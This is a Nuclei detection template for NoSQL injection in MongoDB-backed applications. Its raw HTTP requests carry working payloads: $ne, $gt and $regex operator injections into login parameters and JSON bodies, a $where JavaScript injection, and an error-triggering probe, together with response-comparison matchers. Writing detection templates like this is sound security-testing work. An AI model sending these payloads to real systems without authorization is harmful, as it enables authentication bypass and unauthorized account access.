id: nosql-injection-detection

info:
  name: NoSQL Injection - MongoDB & CouchDB Detection
  author: achraf-chehboun
  severity: high
  description: |
    Detects NoSQL injection in MongoDB-backed applications. Uses baseline comparisons:
    normal login first, then operator injection. Only flags if the injection response
    differs meaningfully from a normal failed login. Requires JSON content-type for
    API tests and differential responses for URL parameter tests.
  reference:
    - https://owasp.org/Top10/A03_2021-Injection/
    - https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05.6-Testing_for_NoSQL_Injection
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N
    cvss-score: 9.1
    cwe-id: CWE-943
  metadata:
    max-request: 10
  tags: owasp-top10,injection,nosql,mongodb,detection-only

http:
  # URL operator injection: baseline normal login vs $ne injection
  - raw:
      - |
        GET /?username=xnlbz_impossible_user&password=xnlbz_impossible_pass HTTP/1.1
        Host: {{Hostname}}
        Accept: text/html
      - |
        GET /?username[$ne]=xnlbz_impossible_user&password[$ne]=xnlbz_impossible_pass HTTP/1.1
        Host: {{Hostname}}
        Accept: text/html

    req-condition: true
    matchers:
      - type: dsl
        name: nosql-ne-operator-bypass
        dsl:
          - 'status_code_2 == 200 && status_code_1 != 200 && status_code_2 != status_code_1'
          - 'status_code_2 == 302 && status_code_1 != 302 && !contains(header_1, "Location") && contains(header_2, "Location")'
        condition: or

  # $regex operator: baseline vs regex injection
  - raw:
      - |
        GET /?username=xnlbz_impossible_user&password=xnlbz_impossible_pass HTTP/1.1
        Host: {{Hostname}}
        Accept: text/html
      - |
        GET /?username[$regex]=.*&password[$regex]=.* HTTP/1.1
        Host: {{Hostname}}
        Accept: text/html

    req-condition: true
    matchers:
      - type: dsl
        name: nosql-regex-bypass
        dsl:
          - 'status_code_2 != status_code_1 && (status_code_2 == 200 || status_code_2 == 302)'
          - 'status_code_2 == 200 && len(body_2) > len(body_1) * 2 && len(body_2) > 200'
        condition: or

  # JSON body injection: normal failed login vs $ne injection
  - raw:
      - |
        POST {{BaseURL}}/api/login HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/json
        Accept: application/json

        {"username":"xnlbz_impossible_user","password":"xnlbz_impossible_pass"}
      - |
        POST {{BaseURL}}/api/login HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/json
        Accept: application/json

        {"username":{"$ne":""},"password":{"$ne":""}}
      - |
        POST {{BaseURL}}/api/login HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/json
        Accept: application/json

        {"username":{"$gt":""},"password":{"$gt":""}}

    req-condition: true
    matchers:
      - type: dsl
        name: json-nosql-auth-bypass
        dsl:
          - '(status_code_1 == 401 || status_code_1 == 403 || status_code_1 == 422) && status_code_2 == 200 && contains(content_type_2, "json") && (contains(body_2, "token") || contains(body_2, "session") || contains(body_2, "success") || contains(body_2, "user"))'
          - '(status_code_1 == 401 || status_code_1 == 403 || status_code_1 == 422) && status_code_3 == 200 && contains(content_type_3, "json") && (contains(body_3, "token") || contains(body_3, "session") || contains(body_3, "success") || contains(body_3, "user"))'
        condition: or

  # $where JavaScript injection: differential test
  - raw:
      - |
        GET /?search=xnlbz_baseline HTTP/1.1
        Host: {{Hostname}}
        Accept: text/html
      - |
        GET /?search=1;return%20true HTTP/1.1
        Host: {{Hostname}}
        Accept: text/html
      - |
        GET /?search=1;return%20false HTTP/1.1
        Host: {{Hostname}}
        Accept: text/html

    req-condition: true
    matchers:
      - type: dsl
        name: where-js-injection
        dsl:
          - 'status_code_1 == 200 && status_code_2 == 200 && status_code_3 == 200 && len(body_2) != len(body_3) && (len(body_2) - len(body_3) > 200 || len(body_3) - len(body_2) > 200) && body_1 != body_2'

  # MongoDB error detection (confirms MongoDB backend)
  - raw:
      - |
        GET /?id=1'%22%5C HTTP/1.1
        Host: {{Hostname}}
        Accept: text/html

    matchers-condition: or
    matchers:
      - type: regex
        name: mongodb-error-exposed
        regex:
          - '(?i)MongoError'
          - '(?i)MongoDB.*?Error'
          - '(?i)Mongo\..*?Exception'
          - '(?i)com\.mongodb'
          - '(?i)mongoose.*?(?:Cast|Validation)?Error'
          - '(?i)CastError.*?ObjectId'
          - '(?i)BSONTypeError'
        condition: or

    extractors:
      - type: regex
        name: nosql-error-detail
        group: 0
        regex:
          - '(?i)((?:Mongo|BSON|mongoose)[\w.]*(?:Error|Exception)[^<\n]{0,200})'
